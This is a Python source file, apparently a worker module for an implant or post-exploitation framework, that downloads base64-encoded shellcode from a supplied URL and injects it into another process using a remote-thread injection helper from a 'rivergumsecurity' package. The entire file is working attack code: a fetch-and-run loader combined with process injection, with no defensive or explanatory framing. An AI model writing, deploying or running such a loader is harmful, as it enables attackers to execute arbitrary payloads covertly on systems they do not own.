import uuid
import re
import base64
import argparse
import platform
import urllib.request
if platform.architecture()[0] == '64bit':
    import rivergumsecurity.process_injection_method1.injector as PI

g_client = None
CATEGORY_WORKER = 4
PROCESS_INJECT_METHOD1_MODULE_ID = uuid.UUID('9388ded0-ed87-11ea-aef6-c3de8b005789')

def init(client, **kwargs):
    """

    :param client:
    :param kwargs:
    :return:
    """
    global g_client
    g_client = client
    return True

def run(url,  **kwargs):
    """
    :param bytes url:
    :param kwargs:
    :return bytes or None: None if post will happen asynchronously
    """
    try:
        if platform.architecture()[0] != '64bit':
            return b'Module only supports x64 architecture'
        elif url and re.match(rb'https?://[/\w\-\.]+', url):
            response = urllib.request.urlopen(url.decode())
            shellcode = base64.b64decode(response.read(), validate=True)
            p = PI.InjectProcess(shellcode)
        else:
            p = PI.InjectProcess()
        return p.Inject_RemoteThread().encode()
    except Exception as e:
        return 'Error: {}'.format(e).encode()

def getinfo():
    """

    :return:
    """
    return { "type": CATEGORY_WORKER, "version" : {"major": 1, "minor": 0}, "id" : PROCESS_INJECT_METHOD1_MODULE_ID}


def deinit(**kwargs):
    """

    :param kwargs:
    :return:
    """
    return True
